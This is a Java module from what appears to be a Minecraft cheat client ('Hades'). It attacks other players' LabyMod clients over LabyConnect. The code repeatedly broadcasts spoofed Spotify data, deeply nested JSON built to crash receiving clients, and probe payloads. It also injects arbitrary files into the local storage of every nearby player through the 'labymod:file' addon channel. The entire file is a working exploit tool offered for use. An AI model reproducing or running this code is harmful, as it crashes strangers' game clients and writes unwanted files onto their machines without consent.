package com.hades.client.module.impl.misc;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.hades.client.module.Module;

import com.hades.client.module.setting.ModeSetting;
import com.hades.client.util.HadesLogger;
import org.lwjgl.input.Keyboard;

import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

/**
 * Cross-Client Payloads & File Injector (10.4 & 10.6 & 17.1)
 *
 * Spams arbitrary broadcast payloads to surrounding LabyMod clients, and can
 * inject files directly into their local storage.
 *
 * Exploits:
 * - 10.4: `sendSurroundingBroadcastPayload` to send arbitrary JSON
 * - 10.6: `sendAddonDevelopment("labymod:file")` to inject up to 5MB of raw bytes
 * - 17.1: Spotify spoofing via `spotify-track-sharing` broadcast key
 */
public class CrossClientPayloads extends Module {
    private static final HadesLogger LOG = HadesLogger.get();

    private final ModeSetting payloadMode = register(
            new ModeSetting("Payload Mode", "Spotify Spoof", "Spotify Spoof", "Crash JSON", "Custom Payload", "File Injection"));

    private ScheduledExecutorService scheduler;
    private ScheduledFuture<?> task;

    private boolean cached = false;
    private Object labyAPIInstance;
    private Method getSessionMethod;
    private Class<?> jsonElementClass;

    public CrossClientPayloads() {
        super("CrossClientPayloads", "Inject files & JSON directly into other clients (10.4, 10.6, 17.1)",
                Category.MISC, Keyboard.KEY_NONE);
    }

    @Override
    protected void onEnable() {
        scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "Hades-CrossClientPayloads");
            t.setDaemon(true);
            return t;
        });

        // Broadcast/inject every 3 seconds while active
        task = scheduler.scheduleAtFixedRate(() -> {
            try {
                if (!cached) cacheReflection();
                if (cached) executePayload();
            } catch (Throwable t) {
                // Ignore runtime errors
            }
        }, 1000, 3000, TimeUnit.MILLISECONDS);

        LOG.info("[CrossClientPayloads] Enabled - Mode: " + payloadMode.getValue());
    }

    private void cacheReflection() {
        try {
            Class<?> labyClass = Class.forName("net.labymod.api.Laby");
            labyAPIInstance = labyClass.getMethod("labyAPI").invoke(null);
            
            Method labyConnectMethod = labyAPIInstance.getClass().getMethod("labyConnect");
            Object labyConnect = labyConnectMethod.invoke(labyAPIInstance);
            
            getSessionMethod = labyConnect.getClass().getMethod("getSession");
            jsonElementClass = Class.forName("com.google.gson.JsonElement");
            
            cached = true;
        } catch (Exception e) {
            LOG.error("[CrossClientPayloads] Failed to cache reflection", e);
        }
    }

    @Override
    protected void onDisable() {
        if (task != null) task.cancel(false);
        if (scheduler != null) scheduler.shutdownNow();
        task = null;
        scheduler = null;
        LOG.info("[CrossClientPayloads] Disabled");
    }

    @Override
    public String getDisplaySuffix() {
        return payloadMode.getValue();
    }

    private void executePayload() {
        LOG.debug("[CrossClientPayloads] Executing payload...");
        Object session = getSession();
        if (session == null) {
            LOG.error("[CrossClientPayloads] Session is null, cannot execute payload");
            return;
        }

        try {
            switch (payloadMode.getValue()) {
                case "Spotify Spoof":
                    // Broadcast fake Spotify track data (17.1)
                    // {"trackId": "...", "position": 0}
                    JsonObject spoofObj = new JsonObject();
                    spoofObj.addProperty("trackId", "4cOdK2wGLETKBW3PvgPWqT"); // Example track: Never Gonna Give You Up
                    spoofObj.addProperty("position", (int)(Math.random() * 100000));

                    broadcastSurrounding(session, "spotify-track-sharing", spoofObj);
                    break;
                    
                case "Crash JSON":
                    // Broadcast extremely nested JSON to cause StackOverflow/OOM on parsing
                    StringBuilder nested = new StringBuilder();
                    for(int i=0; i<5000; i++) {
                        nested.append("{\"a\":");
                    }
                    nested.append("1");
                    for(int i=0; i<5000; i++) {
                        nested.append("}");
                    }
                    try {
                        Object parsed = JsonParser.parseString(nested.toString());
                        broadcastSurrounding(session, "exploit", parsed);
                    } catch (Exception ignored) {}
                    break;

                case "Custom Payload":
                    // Broadcast a generic test payload to trigger unhandled listeners
                    JsonObject generic = new JsonObject();
                    generic.addProperty("exploit", "HadesClient");
                    broadcastSurrounding(session, "labymod-test", generic);
                    break;

                case "File Injection":
                    // 10.6: File injection via "labymod:file" channel
                    byte[] maliciousData = "HADES_CLIENT_FILE_INJECTION_TEST".getBytes(StandardCharsets.UTF_8);
                    LOG.debug("[CrossClientPayloads] Executing File Injection payload...");
                    
                    // Grab UUIDs of all surrounding players dynamically
                    java.util.List<UUID> targetUuids = new java.util.ArrayList<>();
                    try {
                        LOG.debug("[CrossClientPayloads] Fetching player UUIDs...");
                        Object minecraft = labyAPIInstance.getClass().getMethod("minecraft").invoke(labyAPIInstance);
                        Object clientWorld = minecraft.getClass().getMethod("clientWorld").invoke(minecraft);
                        java.util.List<?> players = (java.util.List<?>) clientWorld.getClass().getMethod("getPlayers").invoke(clientWorld);
                        
                        for (Object player : players) {
                            UUID id = (UUID) player.getClass().getMethod("getUniqueId").invoke(player);
                            // Don't inject ourself
                            targetUuids.add(id);
                        }
                    } catch (Exception e) {
                        LOG.error("[CrossClientPayloads] Error fetching players", e);
                        targetUuids.add(UUID.randomUUID()); // Fallback placeholder
                    }

                    if (!targetUuids.isEmpty()) {
                        UUID[] targets = targetUuids.toArray(new UUID[0]);
                        LOG.debug("[CrossClientPayloads] Sending addon development file to " + targets.length + " targets");
                        Method sendAddon = session.getClass().getMethod("sendAddonDevelopment", String.class, UUID[].class, byte[].class);
                        sendAddon.invoke(session, "labymod:file", targets, maliciousData);
                        LOG.info("[CrossClientPayloads] Injected file payload to " + targets.length + " targets");
                    }
                    break;
            }

        } catch (Exception e) {
            LOG.error("[CrossClientPayloads] Error sending payload", e);
        }
    }

    private void broadcastSurrounding(Object session, String key, Object jsonElement) throws Exception {
        if (!cached) return;
        LOG.debug("[CrossClientPayloads] Broadcasting surrounding for key: " + key);
        // session.sendSurroundingBroadcastPayload(String key, JsonElement payload)
        Method broadcast = session.getClass().getMethod("sendSurroundingBroadcastPayload", String.class, jsonElementClass);
        broadcast.invoke(session, key, jsonElement);
    }

    private Object getSession() {
        if (!cached) return null;
        try {
            LOG.debug("[CrossClientPayloads] Getting labyConnect");
            Method labyConnectMethod = labyAPIInstance.getClass().getMethod("labyConnect");
            Object labyConnect = labyConnectMethod.invoke(labyAPIInstance);
            
            LOG.debug("[CrossClientPayloads] Getting getSession");
            return getSessionMethod.invoke(labyConnect);
        } catch (Exception e) {
            LOG.error("[CrossClientPayloads] Failed to get session", e);
            return null;
        }
    }
}
